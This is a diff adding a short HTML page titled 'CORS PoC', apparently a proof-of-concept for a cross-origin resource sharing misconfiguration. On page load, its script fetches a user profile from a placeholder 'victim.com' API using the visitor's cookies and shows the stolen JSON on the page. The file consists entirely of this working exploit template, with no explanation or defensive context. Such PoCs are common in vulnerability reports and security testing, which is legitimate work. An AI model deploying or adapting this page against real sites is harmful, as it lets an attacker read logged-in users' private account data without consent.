@@ -1,1 +1,20 @@
-
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CORS PoC</h2>
+<div id="demo"></div>
+<script>
+fetch("https://victim.com/api/user/profile", {
+    method: "GET",
+    credentials: "include"
+})
+.then(response => response.json())
+.then(data => {
+    document.getElementById("demo").innerText = JSON.stringify(data);
+})
+.catch(error => {
+    document.getElementById("demo").innerText = "Error: " + error;
+});
+</script>
+</body>
+</html>
